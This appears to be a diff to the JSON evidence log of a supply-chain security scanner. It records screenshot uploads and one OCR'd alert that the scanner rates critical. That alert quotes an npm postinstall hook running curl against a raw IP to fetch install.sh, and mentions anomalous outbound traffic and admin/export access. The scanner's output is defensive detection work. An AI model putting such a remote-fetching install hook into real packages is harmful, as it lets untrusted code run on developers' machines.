@@ -1,8 +1,347 @@
 {
   "schema_version": "supplyguard.multimodal-evidence.v1",
-  "updated_at": "2026-06-03T08:01:40.007793+00:00",
+  "updated_at": "2026-06-11T12:00:40.357282+00:00",
   "storage_dir": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal",
   "evidence": [
+    {
+      "evidence_id": "MME-20260611120040129581-DDC20BBF",
+      "filename": "MME-20260611120040129581-DDC20BBF-image-cicd-error.png",
+      "original_filename": "cicd-error.png",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260611120040129581-DDC20BBF-image-cicd-error.png",
+      "relative_path": "storage/multimodal/MME-20260611120040129581-DDC20BBF-image-cicd-error.png",
+      "source_type": "image",
+      "mime_type": "image/png",
+      "size_bytes": 86781,
+      "sha256": "ddc20bbf75475502c7210cb486ea2c86391daf10f72a0108c1837b9a467debfe",
+      "uploaded_at": "2026-06-11T12:00:40.129581+00:00",
+      "metadata": {
+        "extension": ".png",
+        "content_type": "image/png",
+        "width": 1600,
+        "height": 950,
+        "ffprobe": {
+          "programs": [],
+          "stream_groups": [],
+          "streams": [
+            {
+              "codec_name": "png",
+              "codec_type": "video",
+              "width": 1600,
+              "height": 950
+            }
+          ],
+          "format": {}
+        },
+        "video_codec": "png"
+      },
+      "derived": [],
+      "recognitions": [],
+      "entities": [],
+      "findings": [],
+      "risk_score": 0,
+      "risk_level": "low"
+    },
+    {
+      "evidence_id": "MME-20260605112212515224-D40CCA7A",
+      "filename": "MME-20260605112212515224-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "original_filename": "manual-ocr-screenshot.txt",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260605112212515224-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "relative_path": "storage/multimodal/MME-20260605112212515224-D40CCA7A-image-manual-ocr-screenshot.txt",
+      "source_type": "image",
+      "mime_type": "text/plain",
+      "size_bytes": 182,
+      "sha256": "d40cca7a4fd35d3c06bc808cf79a6e860114f915625852131347b0affd3a3e5a",
+      "uploaded_at": "2026-06-05T11:22:12.543427+00:00",
+      "metadata": {
+        "recognized_text_only": true
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "image",
+          "recognized_text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.92,
+          "evidence_type": "visual_ocr",
+          "engine": "manual-asr-ocr-text",
+          "source_path": "storage/multimodal/MME-20260605112212515224-D40CCA7A-image-manual-ocr-screenshot.txt",
+          "language": "zh-CN",
+          "created_at": "2026-06-05T11:22:12.521228+00:00",
+          "segments": [
+            {
+              "text": "npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+              "confidence": 0.92
+            }
+          ]
+        }
+      ],
+      "entities": [
+        {
+          "type": "package",
+          "value": "@acme/payments-helper@9.9.2",
+          "normalized": "@acme/payments-helper@9.9.2",
+          "start": 12,
+          "end": 39,
+          "confidence": 0.95,
+          "source": "regex",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/instal"
+        },
+        {
+          "type": "action",
+          "value": "postinstall",
+          "normalized": "postinstall",
+          "start": 40,
+          "end": 51,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 ch"
+        },
+        {
+          "type": "action",
+          "value": "curl",
+          "normalized": "curl",
+          "start": 53,
+          "end": 57,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "nstall @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout"
+        },
+        {
+          "type": "ip",
+          "value": "185.199.108.153",
+          "normalized": "185.199.108.153",
+          "start": 65,
+          "end": 80,
+          "confidence": 0.96,
+          "source": "regex",
+          "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+        },
+        {
+          "type": "time",
+          "value": "凌晨三点",
+          "normalized": "凌晨三点",
+          "start": 92,
+          "end": 96,
+          "confidence": 0.78,
+          "source": "regex",
+          "evidence": "install: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "service",
+          "value": "checkout-api",
+          "normalized": "checkout-api",
+          "start": 97,
+          "end": 109,
+          "confidence": 0.82,
+          "source": "regex",
+          "evidence": "ll: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "异常外联",
+          "normalized": "异常外联",
+          "start": 112,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "/185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "外联",
+          "normalized": "外联",
+          "start": 114,
+          "end": 116,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "85.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "action",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.82,
+          "source": "keyword",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        },
+        {
+          "type": "api_path",
+          "value": "admin/export",
+          "normalized": "admin/export",
+          "start": 117,
+          "end": 129,
+          "confidence": 0.88,
+          "source": "regex",
+          "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+        }
+      ],
+      "findings": [
+        {
+          "id": "MMF-F501D8AD0B3059B2",
+          "rule_id": "multimodal-postinstall-egress",
+          "title": "截图或语音中出现安装脚本外联",
+          "severity": "critical",
+          "score": 96,
+          "evidence_id": "MME-20260605112212515224-D40CCA7A",
+          "source_type": "image",
+          "source_name": "manual-ocr-screenshot.txt",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "postinstall",
+            "curl"
+          ],
+          "entities": [
+            {
+              "type": "ip",
+              "value": "185.199.108.153",
+              "normalized": "185.199.108.153",
+              "start": 65,
+              "end": 80,
+              "confidence": 0.96,
+              "source": "regex",
+              "evidence": "/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/expor"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.881,
+          "recommendation": "立即隔离相关依赖包和构建产物，固定私有源解析，封禁外联目标，并使用可信 runner 重新构建。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://github.com/SigmaHQ/sigma",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.supply_chain",
+            "attack.execution",
+            "multimodal.ocr",
+            "sigma-style",
+            "wazuh.severity.critical"
+          ],
+          "first_seen": "2026-06-05T11:22:12.540313+00:00",
+          "fingerprint": "multimodal-finding:f501d8ad0b3059b2"
+        },
+        {
+          "id": "MMF-C6B6B0289C480D40",
+          "rule_id": "multimodal-sensitive-interface-anomaly",
+          "title": "语音或截图中出现敏感接口异常访问",
+          "severity": "high",
+          "score": 84,
+          "evidence_id": "MME-20260605112212515224-D40CCA7A",
+          "source_type": "image",
+          "source_name": "manual-ocr-screenshot.txt",
+          "evidence_type": "visual_ocr",
+          "matched_keywords": [
+            "admin/export"
+          ],
+          "entities": [
+            {
+              "type": "api_path",
+              "value": "admin/export",
+              "normalized": "admin/export",
+              "start": 117,
+              "end": 129,
+              "confidence": 0.88,
+              "source": "regex",
+              "evidence": "199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。"
+            }
+          ],
+          "evidence": "npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。",
+          "confidence": 0.819,
+          "recommendation": "将识别到的接口路径与 Web/WAF 日志同时间窗比对，必要时临时关闭导出接口或提高鉴权策略。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.collection",
+            "attack.exfiltration",
+            "multimodal.asr",
+            "sigma-style"
+          ],
+          "first_seen": "2026-06-05T11:22:12.540313+00:00",
+          "fingerprint": "multimodal-finding:c6b6b0289c480d40"
+        }
+      ],
+      "risk_score": 96,
+      "risk_level": "critical"
+    },
+    {
+      "evidence_id": "MME-20260605112203250782-DDC20BBF",
+      "filename": "MME-20260605112203250782-DDC20BBF-image-cicd-error.png",
+      "original_filename": "cicd-error.png",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260605112203250782-DDC20BBF-image-cicd-error.png",
+      "relative_path": "storage/multimodal/MME-20260605112203250782-DDC20BBF-image-cicd-error.png",
+      "source_type": "image",
+      "mime_type": "image/png",
+      "size_bytes": 86781,
+      "sha256": "ddc20bbf75475502c7210cb486ea2c86391daf10f72a0108c1837b9a467debfe",
+      "uploaded_at": "2026-06-05T11:22:03.250782+00:00",
+      "metadata": {
+        "extension": ".png",
+        "content_type": "image/png",
+        "width": 1600,
+        "height": 950,
+        "ffprobe": {
+          "programs": [],
+          "stream_groups": [],
+          "streams": [
+            {
+              "codec_name": "png",
+              "codec_type": "video",
+              "width": 1600,
+              "height": 950
+            }
+          ],
+          "format": {}
+        },
+        "video_codec": "png"
+      },
+      "derived": [],
+      "recognitions": [],
+      "entities": [],
+      "findings": [],
+      "risk_score": 0,
+      "risk_level": "low"
+    },
+    {
+      "evidence_id": "MME-20260603143717219602-DDC20BBF",
+      "filename": "MME-20260603143717219602-DDC20BBF-image-cicd-error.png",
+      "original_filename": "cicd-error.png",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603143717219602-DDC20BBF-image-cicd-error.png",
+      "relative_path": "storage/multimodal/MME-20260603143717219602-DDC20BBF-image-cicd-error.png",
+      "source_type": "image",
+      "mime_type": "image/png",
+      "size_bytes": 86781,
+      "sha256": "ddc20bbf75475502c7210cb486ea2c86391daf10f72a0108c1837b9a467debfe",
+      "uploaded_at": "2026-06-03T14:37:17.219602+00:00",
+      "metadata": {
+        "extension": ".png",
+        "content_type": "image/png",
+        "width": 1600,
+        "height": 950,
+        "ffprobe": {
+          "programs": [],
+          "stream_groups": [],
+          "streams": [
+            {
+              "codec_name": "png",
+              "codec_type": "video",
+              "width": 1600,
+              "height": 950
+            }
+          ],
+          "format": {}
+        },
+        "video_codec": "png"
+      },
+      "derived": [],
+      "recognitions": [],
+      "entities": [],
+      "findings": [],
+      "risk_score": 0,
+      "risk_level": "low"
+    },
     {
       "evidence_id": "MME-20260603080139438792-D40CCA7A",
       "filename": "MME-20260603080139438792-D40CCA7A-image-manual-ocr-screenshot.txt",
